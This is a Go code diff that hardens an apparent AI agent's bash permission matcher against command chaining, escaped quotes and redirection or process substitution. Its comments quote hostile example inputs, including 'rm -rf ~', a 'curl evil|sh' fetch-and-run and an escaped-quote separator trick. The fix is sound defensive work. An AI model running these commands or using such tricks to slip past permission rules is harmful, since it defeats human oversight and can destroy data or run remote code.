@@ -21,6 +21,14 @@ func matchRule(rule Rule, toolName, pattern string) bool {
 	// approve "git status; rm -rf ~" because the matcher only saw the
 	// first token. The wildcard rule "*" still matches anything.
 	if toolName == "bash" && rule.Pattern != "*" && hasShellSeparator(arg) {
+		// Redirection and process substitution markers (<, >, <(, >()
+		// cannot be safely split into independent segments — bash
+		// nests the inner command inside the outer one's syntax, and
+		// our segmenter doesn't re-enter those. Refuse to match rather
+		// than risk allowing a bypass like `grep foo <(curl evil|sh)`.
+		if containsUnquoted(arg, "<") || containsUnquoted(arg, ">") {
+			return false
+		}
 		segments := splitShellSegments(arg)
 		for _, seg := range segments {
 			seg = strings.TrimSpace(seg)
@@ -46,10 +54,15 @@ func hasShellSeparator(s string) bool {
 	var inSingle, inDouble bool
 	for i := 0; i < len(s); i++ {
 		c := s[i]
-		// Toggle quote state. We don't try to handle escape sequences
-		// inside double quotes — the goal here is conservative: if
-		// the entire command is a normal POSIX command line, we just
-		// want to know whether a top-level separator exists.
+		// Honor bash backslash escapes outside single quotes so
+		// `\"` is treated as a literal `"` instead of as opening
+		// a quoted region. Without this, `echo \" ; touch /pwn`
+		// would hide its `;` behind an incorrectly-opened quote.
+		// Parity fix with internal/sandbox.
+		if c == '\\' && !inSingle {
+			i++
+			continue
+		}
 		if c == '\'' && !inDouble {
 			inSingle = !inSingle
 			continue
@@ -72,6 +85,14 @@ func hasShellSeparator(s string) bool {
 		case '`':
 			return true
 		case '\n':
+			return true
+		case '>', '<':
+			// Redirection operators — a redirection can invoke
+			// process substitution "<(cmd)" / ">(cmd)" which bash
+			// expands to a nested command. Even simple redirections
+			// like ">file" can subvert read-only policies, so force
+			// segment-level analysis (which currently has no way to
+			// allow any redirection and therefore denies).
 			return true
 		case '$':
 			if i+1 < len(s) && s[i+1] == '(' {
@@ -131,6 +152,37 @@ func splitShellSegments(s string) []string {
 	}
 	flush()
 	return segments
+}
+
+// containsUnquoted reports whether s contains any of the characters in
+// needle outside of single or double quotes. Used to detect shell
+// redirection operators that would otherwise bypass rule matching.
+// Backslash escapes the next char outside single quotes (same as bash)
+// so `\"` doesn't accidentally open a quoted region.
+func containsUnquoted(s, needle string) bool {
+	var inSingle, inDouble bool
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if c == '\\' && !inSingle {
+			i++
+			continue
+		}
+		if c == '\'' && !inDouble {
+			inSingle = !inSingle
+			continue
+		}
+		if c == '"' && !inSingle {
+			inDouble = !inDouble
+			continue
+		}
+		if inSingle || inDouble {
+			continue
+		}
+		if strings.IndexByte(needle, c) >= 0 {
+			return true
+		}
+	}
+	return false
 }
 
 func globMatch(pattern, value string) bool {
